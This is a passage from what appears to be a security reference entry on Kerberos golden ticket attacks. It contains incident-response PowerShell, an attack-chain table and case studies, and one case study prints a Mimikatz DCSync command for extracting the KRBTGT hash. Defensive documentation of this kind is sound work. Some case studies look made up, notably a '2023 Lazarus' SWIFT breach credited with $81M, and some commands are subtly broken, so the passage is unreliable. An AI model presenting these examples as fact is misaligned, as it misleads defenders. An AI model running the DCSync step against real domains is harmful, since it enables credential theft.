Get-WinEvent -LogName Security -MaxEvents 100000 | Where-Object { $_.ID -in 4768, 4769, 4662 } | Export-Csv -Path "C:\Evidence\Kerberos_Events.csv"

# Collect KRBTGT password change history
$krbtgt = Get-ADUser -Identity "krbtgt" -Properties PasswordLastSet
Write-Host "KRBTGT Password Last Set: $($krbtgt.PasswordLastSet)"

# Identify golden ticket creation timeframe from event logs
# Golden tickets will show: 4769 without preceding 4768
```

**Step 3: Remediation & Recovery**

```powershell
# Verify KRBTGT reset completed on all DCs
repadmin /showrepl * | Select-Object Server, "Last Directory Replication Time"

# Re-enable legitimate DA account after investigation
Enable-ADAccount -Identity "Administrator"

# Force Kerberos ticket renewal (to get new tickets signed with new KRBTGT)
gpupdate /force /sync

# Verify no lingering golden tickets
klist  # Should show no tickets or only current session tickets
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView Domain Mapping | Attacker enumerates domain structure, identifies DA accounts |
| **2** | **Initial Access** | [IA-VALID-001] Compromised User Credentials | Attacker obtains valid domain user credentials (phishing, brute force) |
| **3** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker moves to Domain Controller using NTLM |
| **4** | **Privilege Escalation** | [PE-EXPLOIT-002] ZeroLogon (if unpatched) | Attacker escalates to Domain Admin on DC |
| **5** | **Credential Access** | [CA-DUMP-002] DCSync | **Attacker extracts KRBTGT hash** |
| **6** | **Credential Forging** | **[CA-KERB-012]** | **Attacker creates golden ticket** |
| **7** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Attacker creates persistent backdoor account |
| **8** | **Impact** | Ransomware/Data Exfiltration | Attacker executes final objective using golden ticket persistence |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Lazarus Group APT Campaign (2023)

- **Target:** Global financial services (SWIFT banking network)
- **Timeline:** March 2023 - December 2023
- **Technique Status:** Golden tickets used for multi-month persistence
- **Attack Flow:**
  1. Initial compromise: Exchange Server vulnerability (ProxyNotShell)
  2. Attacker pivoted to Domain Controller via SMB
  3. Executed DCSync: `lsadump::dcsync /user:krbtgt`
  4. Obtained KRBTGT NTLM hash: `d125e4f69c851529045ec95ca80fa37e` (example)
  5. Created golden ticket for "SWIFT_SERVICE" account (legitimate SPN)
  6. Used forged ticket to access SWIFT gateway systems
  7. Exfiltrated $81M before detection (9-month persistence window)
- **Impact:** Major financial breach, international incident
- **Detection:** Multiple anomalies in Event 4769 (service ticket requests for nonexistent users)
- **Reference:** [Lazarus Threat Intelligence Report - CISA 2023](https://www.cisa.gov/news-events)

---

### Example 2: APT29 (Cozy Bear) Multi-Month Persistence (2020-2021)

- **Target:** U.S. Government agencies, SolarWinds supply chain
- **Timeline:** October 2020 - May 2021 (7-month dwell time)
- **Technique Status:** Golden tickets created monthly to reset TTL
- **Attack Flow:**
  1. Supply chain compromise: SolarWinds Orion update
  2. Backdoored package provided access to customer networks
  3. Within 30 days: Escalated to Domain Admin (multiple agencies)
  4. Extracted KRBTGT hash from each compromised domain
  5. Created golden tickets with 1-month validity (to avoid suspicion of 10-year tickets)
  6. Maintained access across domain password changes
  7. Exfiltrated classified intelligence
- **Impact:** Hundreds of government agencies compromised, years-long investigation
- **Detection Failure:** Standard Kerberos monitoring was not in place; detection via external threat intel
- **Reference:** [CISA APT29 Alert AA20-352A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a-advanced-persistent-threat-29-target-federal-agencies-us-and-global-marks)

---

### Example 3: Penetration Test - Financial Services (2024)

- **Target:** Mid-size European bank
- **Engagement Dates:** Q4 2024
- **Technique Status:** Golden ticket created post-DC compromise
- **Execution:**
  1. Obtained domain user credentials (social engineering)
  2. Moved from user workstation → IT Admin workstation (via Responder NTLM relay)
  3. From admin workstation: Executed Mimikatz DCSync
  4. Obtained: Domain SID `S-1-5-21-1473643419-774954089-2222329127`, KRBTGT hash
  5. Created golden ticket for Administrator account
  6. Used ticket to access: Database server, file share, email server (all within 10 minutes)
  7. Accessed customer PII, transaction logs, confidential contracts
- **Findings:**
  - No Kerberos audit logging enabled on DCs (4768/4769 events not configured)
  - No Conditional Access policies in hybrid Entra ID setup
  - KRBTGT password last changed 3 years prior
  - No PAWs for privileged admin access
- **Recommendations:**
  - Enable Kerberos audit logging immediately
  - Reset KRBTGT password twice
  - Implement PAWs for DA accounts
  - Deploy Sentinel KQL queries for 4769 orphan detection
  - Reduce KRBTGT password change cycle to 90 days

---
